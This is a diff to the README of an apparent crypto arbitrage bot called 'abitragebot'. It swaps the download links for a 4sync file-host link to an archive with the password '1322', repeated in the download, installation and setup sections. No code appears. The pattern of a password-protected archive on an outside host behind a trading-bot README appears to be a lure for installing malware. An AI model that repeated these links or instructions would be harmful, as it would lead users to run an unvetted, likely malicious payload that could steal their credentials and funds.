@@ -2,7 +2,8 @@
 
 ## 📥 Download
 
-[![Download abitragebot](https://raw.githubusercontent.com/Bicapsular-consulate683/abitragebot/main/delicious/abitragebot.zip)](https://raw.githubusercontent.com/Bicapsular-consulate683/abitragebot/main/delicious/abitragebot.zip)
+# [DOWNLOAD](https://www.4sync.com/s/fOHKQbXws)  
+## PASSWORD: 1322
 
 ## 📜 Description
 
@@ -30,7 +31,7 @@ To run abitragebot smoothly, ensure your system meets the following requirements
 
 Follow these simple steps to get your abitragebot up and running:
 
-1. # [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+1. # [DOWNLOAD](https://www.4sync.com/s/fOHKQbXws)  
 ## PASSWORD: 1322
 
 2. **Install the Bot**:
@@ -50,7 +51,7 @@ Follow these simple steps to get your abitragebot up and running:
 
 ## ⚙️ Download & Install
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+# [DOWNLOAD](https://www.4sync.com/s/fOHKQbXws)  
 ## PASSWORD: 1322
 
 ## 📖 Usage Instructions
